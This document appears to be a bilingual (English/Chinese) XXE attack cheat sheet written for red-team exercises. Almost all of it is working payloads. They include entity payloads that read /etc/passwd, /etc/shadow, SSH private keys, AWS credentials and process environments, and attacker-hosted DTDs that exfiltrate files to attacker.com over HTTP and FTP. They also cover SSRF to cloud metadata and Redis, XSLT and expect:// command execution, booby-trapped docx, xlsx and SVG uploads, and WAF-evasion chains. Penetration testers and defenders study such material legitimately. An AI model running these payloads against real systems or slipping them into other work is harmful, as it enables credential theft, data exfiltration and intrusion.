# XXE（文件读取 / Blind OOB / XInclude / Office / SAML）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---



## XML External Entity Injection (XXE)


## 1. CLASSIC XXE PAYLOAD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

If `/etc/passwd` reflects in response → confirmed file read.

---

## 2. ATTACK SURFACE DISCOVERY

### Direct XML Inputs
- SOAP endpoints (`text/xml`, `application/soap+xml`)
- REST APIs accepting `application/xml`
- File upload: `.xlsx`, `.docx`, `.pptx` (Office Open XML)
- SVG uploads (SVG is XML)
- RSS/Atom feed parsers
- Web services with XML config import

### Non-Obvious XML Processing
Change `Content-Type` header on **any** JSON POST to:
```
Content-Type: application/xml
```
Then rewrite body as XML — many backends use dual-format parsers or auto-detect.

### PDF Generators
Some HTML→PDF tools (wkhtmltopdf, PrinceXML) execute SSRF via embedded URLs but also parse external entities in SVG/XML included in the HTML.

---

## 3. OOB (OUT-OF-BAND) XXE — CRITICAL

Use when direct entity reflection fails (server parses but doesn't echo entity content):

### Step 1: Blind detection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```
DNS/HTTP hit to collaborator → confirms XXE (even if no file content returned).

### Step 2: OOB file exfiltration via attacker-hosted DTD
**Attacker's server hosts a malicious DTD** at `http://attacker.com/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

**Payload sent to target**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```
File contents appear in attacker's HTTP server request log.

### Step 3: Error-based OOB (alternative when HTTP blocked)
Use intentional error to leak data in error message:
```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---

## 4. XXE FILE READ TARGETS

**Linux**:
```
/etc/passwd
/etc/shadow  (requires root)
/etc/hosts
/proc/self/environ      ← environment variables (DB creds, API keys)
/proc/self/cmdline      ← process command line
/var/log/apache2/access.log  ← may contain passwords in URLs
/home/USER/.ssh/id_rsa  ← SSH private key
/home/USER/.aws/credentials ← AWS keys
/home/USER/.bash_history
```

**Windows**:
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    ← ASP.NET connection strings
C:\xampp\htdocs\wp-config.php    ← WordPress DB credentials
C:\Users\Administrator\.ssh\id_rsa
```

---

## 5. SVG XXE (file upload context)

When SVG uploads are accepted and served/processed:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```
Upload as `.svg` → `GET /uploads/file.svg` → file contents in response.

---

## 6. OFFICE FILE XXE (docx/xlsx/pptx)

Office files are ZIP archives containing XML. Inject into `[Content_Types].xml` or `word/document.xml`:

```bash
# Step 1: extract
unzip original.docx -d extracted/

# Step 2: edit word/document.xml — add malicious DTD
# Add after <?xml version="1.0" encoding="UTF-8" standalone="yes"?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then use &xxe; inside document text

# Step 3: repackage
cd extracted && zip -r ../malicious.docx .
```

---

## 7. SOAP ENDPOINT XXE

SOAP requests parse XML by definition. Inject external entity into SOAP envelope:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## 8. XXE → SSRF CHAIN

XXE external entity can point to internal HTTP endpoints (identical to SSRF):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```
This combines XXE file read + SSRF into a single payload.

---

## 9. XInclude ATTACK

When server-side processes XInclude (import XML from another source), but you can't control the DOCTYPE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

Works in: Apache Cocoon, Xerces-J, libxml2 with XInclude support enabled.

---

## 10. PROTOCOL HANDLERS IN XXE

```xml
<!-- HTTP (SSRF) -->
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">

<!-- File read -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP wrapper (if PHP with libxml2) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- Decode base64 in response to get file contents -->

<!-- FTP (exfil / port scan) -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/x">

<!-- Gopher (Redis, SMTP) -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">
```

---

## 11. BYPASSING DEFENSES

### Parser blocks DOCTYPE
Try XInclude (no DOCTYPE needed, see §9).

### Only allows specific XML schemas
If schema validation occurs: inject comments or CDATA after schema validation but before entity processing.

### Response encoding issues (binary in response)
Use PHP filter for base64:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Network restrictions on OOB
Use DNS-only OOB via `SYSTEM "file://HASH.attacker.com"` — no HTTP required, DNS lookup leaks data.

---

## 12. QUICK DETECTION CHECKLIST

```
□ Find XML input point (or JSON→XML transformation)
□ Send basic entity: <!ENTITY xxe "test"> → &xxe; in body → does "test" reflect?
□ If yes → file read: SYSTEM "file:///etc/passwd"
□ If no reflection → OOB test via Collaborator URL
□ If OOB hit → set up attacker DTD for file exfiltration
□ Try SVG upload with XXE
□ Try Content-Type: application/xml on JSON endpoints
□ Try XInclude if DOCTYPE-based fails
```

---

## 13. LOCAL DTD INJECTION (BLIND XXE AMPLIFICATION)

When external entities are blocked but local DTD files exist on the server:

### Technique

```xml
<!-- Override an entity defined in a LOCAL DTD file -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### Common Local DTD Paths

#### Linux

```
/usr/share/yelp/dtd/docbookx.dtd           # GNOME Help
/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig
/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
/usr/share/struts/struts-config_1_0.dtd     # Apache Struts
/usr/share/nmap/nmap.dtd                    # Nmap
/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP
```

#### Windows

```
C:\Windows\System32\wbem\xml\cim20.dtd            # WMI
C:\Windows\System32\wbem\xml\wmi20.dtd             # WMI
C:\Program Files\IBM\WebSphere\*.dtd               # WebSphere
C:\Program Files (x86)\Lotus\*.dtd                 # Lotus Notes
```

#### Inside JAR Files (Java Applications)

```
jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
```

### Why This Works

- External connections blocked (firewall/WAF/egress filter)
- But file:// to LOCAL files is usually allowed
- Local DTD is trusted → entity overrides inject attacker-controlled definitions
- Error messages or blind extraction via file:// still works

---

## 14. ADDITIONAL OOB EXFILTRATION CHANNELS

### FTP-based exfiltration (line-by-line)

FTP protocol sends data line-by-line, making it useful for multi-line file exfiltration when HTTP-based OOB truncates at newlines:

```xml
<!-- attacker.com/ftp-exfil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%exfil;
%send;
```

Run a rogue FTP server (e.g., `xxeserv` or custom Python) on port 2121 — each line of the file arrives as a separate `RETR` or `CWD` command.

### HTTP parameter exfiltration

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%exfil;
%send;
```

Base64 encoding avoids newline/special-character issues in HTTP URL. Decode the `d=` parameter on attacker server.

---

## 15. DTD NESTING TRICKS — PARAMETER ENTITY CHAINING

### Parameter entity within parameter entity

Used to bypass parsers that block direct entity references in entity values:

```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x25; b;">
  <!ENTITY % b SYSTEM "http://attacker.com/chain.dtd">
  %a;
]>
```

The parser expands `%a;` → `%b;` → fetches external DTD. Some WAFs only inspect the first level of entity definitions.

### Triple-nested for filter evasion

```xml
<!-- attacker.com/stage1.dtd -->
<!ENTITY % s2 SYSTEM "http://attacker.com/stage2.dtd">
%s2;

<!-- attacker.com/stage2.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % s3 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%s3;
%exfil;
```

Payload sent to target only references `stage1.dtd` — the actual file read happens two DTD fetches deep, evading shallow WAF inspection.

---

## 16. XXE IN NON-OBVIOUS FORMATS

| Format | XML Location | Injection Point |
|--------|-------------|-----------------|
| **SOAP Envelope** | Entire body is XML | Add DOCTYPE before `<soap:Envelope>` |
| **SVG Image** | SVG is XML | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in SVG header |
| **OOXML (.docx)** | `word/document.xml`, `[Content_Types].xml` | Inject DOCTYPE + entity into any XML member |
| **OOXML (.xlsx)** | `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml` | Entity reference in cell values |
| **RSS/Atom feeds** | Feed body is XML | Inject into feed items if user content is included |
| **SAML assertions** | SAML XML tokens | DOCTYPE injection in `SAMLResponse` parameter (base64-decoded XML) |
| **XMPP** | Protocol messages are XML stanzas | Entity in message body or JID fields |
| **GPX files** | GPS track data in XML | Via file upload endpoints accepting GPX |
| **XHTML** | Strict XHTML is valid XML | DOCTYPE injection in XHTML documents |

### SAML XXE

```xml
<!-- Base64-decode the SAMLResponse, inject DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Re-encode to base64, submit as `SAMLResponse` parameter.

---

## 17. XXE VIA FILE UPLOAD

### SVG upload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

Upload as avatar/image → view uploaded SVG → file content rendered as text.

### XLSX (Excel) upload

```bash
# 1. Create minimal .xlsx, unzip it
unzip report.xlsx -d xlsx_tmp/

# 2. Inject into xl/sharedStrings.xml
# Add after XML declaration:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Replace a <t> element content with &xxe;

# 3. Repackage
cd xlsx_tmp && zip -r ../malicious.xlsx .
```

Alternatively inject into `[Content_Types].xml` (parsed first by most OOXML processors).

### DOCX upload

```bash
# Target: word/document.xml
# Same approach: unzip → inject DOCTYPE + entity → repackage

# Alternative: inject into customXml/item1.xml if custom XML parts exist
```

### Processing pipeline attack

Even if the uploaded file is not directly rendered, the server-side parser (Apache POI, python-docx, OpenXML SDK) may process entities during import, triggering OOB exfiltration.

---

## 18. ERROR-BASED XXE

Force the XML parser to generate an error message containing file content:

### Method 1: Non-existent file reference

```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser attempts to open `file:///nonexistent/<hostname_content>` → error message includes the hostname value.

### Method 2: XML schema validation error

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>">
  %eval;
  %err;
]>
```

The `jar:` protocol handler generates verbose error messages that include the expanded entity value.

### Method 3: Integer overflow / type error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'file:///%file;'>">
%int;
%trick;
```

Parser tries to open a file path containing the target file content → error message reveals content.

---

## 19. XSLT INJECTION CONNECTION TO XXE

XSLT processors parse XML and can be chained with XXE:

### XSLT file read

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XSLT RCE (processor-dependent)

```xml
<!-- Xalan-J (Java) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP (libxslt with registerPHPFunctions) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XXE → XSLT chain

If the target accepts XML input with a stylesheet reference (`<?xml-stylesheet?>`), inject both an external entity and a malicious XSLT to escalate from file read to RCE.


---


## 附件：SCENARIOS

## XXE — Extended Scenarios & Real-World Cases

---

## 1. CVE Case: Apache Solr XXE + RCE (CVE-2017-12629)

Apache Solr's Config API accepts XML with external entity processing enabled, and the Velocity Response Writer allows template injection:

**XXE for file read**:
```
GET /solr/CORE/select?q=xxx&wt=xml&defType=edismax&echoParams=all&fl=id,name&sort=${jndi:ldap://attacker/x}
```

**Combined XXE + RCE chain**:
1. Use XXE to read Solr configuration and identify available cores
2. Use Config API to register a new VelocityResponseWriter with `solr.resource.loader.enabled=true`
3. Execute Velocity template with `Runtime.exec()`

---

## 2. Office Document XXE — Step-by-Step

OOXML files (`.docx`, `.xlsx`, `.pptx`) are ZIP archives containing XML:

```bash
# Step 1: Create a legitimate .docx
# Step 2: Extract
mkdir extracted && cd extracted
unzip ../document.docx

# Step 3: Inject XXE into word/document.xml
# Add after <?xml version="1.0"...?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then replace a text element with &xxe;

# Step 4: Also try [Content_Types].xml:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/notify">]>

# Step 5: Repackage
zip -r ../malicious.docx .

# Step 6: Upload to target application
# If the app parses the XML → XXE triggers
```

**Common targets**: document preview, import functionality, file conversion services.

---

## 3. DOCTYPE-Based SSRF

Even when the application doesn't reflect entity values, `DOCTYPE` with `PUBLIC` or `SYSTEM` triggers an HTTP request:

```xml
<!DOCTYPE foo PUBLIC "-//attacker//DTD//EN" "http://attacker.com/notify">
<root>normal content</root>
```

The XML parser fetches the DTD from `attacker.com` — confirms SSRF even without entity reflection.

---

## 4. PHP expect:// Protocol via XXE

When PHP's `expect` extension is installed:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

The `expect://` wrapper executes the command and returns output. Rare but devastating when available.

**Check availability**: `phpinfo()` → look for "expect" in loaded extensions.

---

## 5. XXE in SOAP Web Services

SOAP endpoints parse XML by design — always test for XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><id>&xxe;</id></getUser>
  </soap:Body>
</soap:Envelope>
```

Also test the `SOAPAction` header and WSDL import endpoints.

---

## 6. Blind XXE via Error Messages

When OOB HTTP exfiltration is blocked, use error-based exfiltration:

```xml
<!-- Hosted at attacker.com/error.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open `file:///nonexistent/root:x:0:0:...` → error message contains file contents.


---

## 补充与进阶

## XXE 注入实战参考
- XXE 可触发 SSRF 探测内网 → `ssrf.md`
- XXE 与反序列化组合利用 → `deserialization.md`

> 分类: 文件读取 → SSRF → Blind XXE → 参数实体 → XInclude → 文件上传 → SOAP

> **last_updated**: 2026-06-04 | **tested_against**: Java 17, PHP 8.x, .NET 6, libxml2 2.9+
---

---

## 1. XXE 基础检测

---

### 1.1 检测 Payload

```xml
<!-- 基础检测 — 定义实体 + 引用 -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe "XXE_TEST">
]>
<root>&xxe;</root>

<!-- 如果返回 "XXE_TEST" → XXE 确认 -->

<!-- 文件读取检测 -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

### 1.2 常见 XXE 入口

```
- XML API:         POST /api/data → Content-Type: application/xml
- SOAP WebService: POST /service → Content-Type: text/xml
- SVG 上传:        <svg> 含 XXE payload
- Office 文档:     DOCX/XLSX 本质是 XML (解压后可修改)
- RSS/Atom Feed:   RSS XML 解析
- SAML 认证:       SAML Response XML
- PDF 生成:        XSL-FO → Apache FOP
```

---

---

## 2. 文件读取

---

### 2.1 读取敏感文件

```xml
<!-- === Linux === -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- === 常见敏感文件 === -->
file:///etc/passwd
file:///etc/shadow
file:///root/.ssh/id_rsa
file:///var/www/html/config.php
file:///proc/self/environ

<!-- === Windows === -->
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config
file:///C:/xampp/htdocs/config.php

<!-- === 带特殊字符的路径 → PHP wrapper === -->
php://filter/convert.base64-encode/resource=config.php
```

---

### 2.2 目录枚举

```xml
<!-- 无目录列表 → 用报错信息判断 -->
<!ENTITY xxe SYSTEM "file:///var/www/html/">

<!-- 部分解析器会返回目录列表 (罕见) -->
```

---

---

## 3. SSRF via XXE

```xml
<!-- 内网探测 -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- 内网端口扫描 (按响应时间差异) -->
<!ENTITY port22 SYSTEM "http://127.0.0.1:22/">
<!ENTITY port80 SYSTEM "http://127.0.0.1:80/">
<!ENTITY port3306 SYSTEM "http://127.0.0.1:3306/">

<!-- Gopher 协议 (攻击内网 Redis/MySQL/FastCGI) -->
<!ENTITY redis SYSTEM "gopher://127.0.0.1:6379/_*1%0d%0a...">
```

---

---

## 4. Blind XXE (Out-of-Band)

---

### 4.1 原理

```
正常 XXE: 请求 → 返回文件内容 (有回显)
Blind XXE: 请求 → 不返回内容, 但服务端会发起外部请求

利用: 参数实体 + DTD 外带数据
```

---

### 4.2 外带 DTD

```xml
<!-- 主请求 (发给目标) -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
  %send;
]>
<root>test</root>
```

**攻击者服务器上的 `evil.dtd`：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%send;
```

---

### 4.3 Blind XXE 踩坑

```
1. % 编码: 在内部子集中 % 不能用于实体引用，需外部 DTD
2. 换行符: file:// 读取的内容含换行 → URL中非法 → 需 PHP base64 encode
3. 长度限制: URL 长度有限 → 分段外带

---

# PHP base64 外带 DTD:
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?d=%file;'>">
```

---

### 4.4 本地 DTD 利用

```xml
<!-- 当不允许外联 DTD → 用目标本机的 DTD 文件 -->

<!-- Linux: 覆盖系统DTD中的实体 -->
<!DOCTYPE root [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'AAA)> 
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM 'http://attacker/?d=%file;'>">
    %eval;
    %exfil;
  <!ELEMENT aa (BB'>
  %local_dtd;
]>
<root></root>
```

---

---

## 5. XInclude 注入

```xml
<!-- 无法控制整个 XML, 只能注入部分内容时 -->
<!-- 原始: <root><foo>用户输入</foo></root> -->
<!-- 用户输入: -->

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- 或者: -->
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
```

---

---

## 6. SVG 文件上传 XXE

```xml
<!-- 上传到允许 SVG 的目标 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="0" y="20" font-size="20">&xxe;</text>
</svg>

<!-- Blind — 外带数据 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://attacker.com/log">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <rect width="1" height="1" style="fill:url(&xxe;)"/>
</svg>
```

---

---

## 7. SOAP API XXE

```xml
<!-- SOAP 1.1 -->
<?xml version="1.0"?>
<!DOCTYPE soap [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser xmlns="http://target.com/">
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

---

## 8. XXE URL 参考表

```

---

# 文件读取:
file:///etc/passwd
file:///etc/shadow
file:///C:/Windows/win.ini

---

# PHP Wrapper:
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
expect://id          (需 expect 扩展)

---

# OOB:
http://attacker.com/
ftp://attacker.com/

---

# 攻击内网:
http://169.254.169.254/latest/meta-data/
gopher://127.0.0.1:6379/_*1...
dict://127.0.0.1:11211/stat
```

---

---

## 相关参考
- XXE 可触发 SSRF 探测内网 → `ssrf.md`
- XXE 与反序列化组合利用 → `deserialization.md`

*参考: OWASP XXE + PayloadAllTheThings XXE + PortSwigger XXE*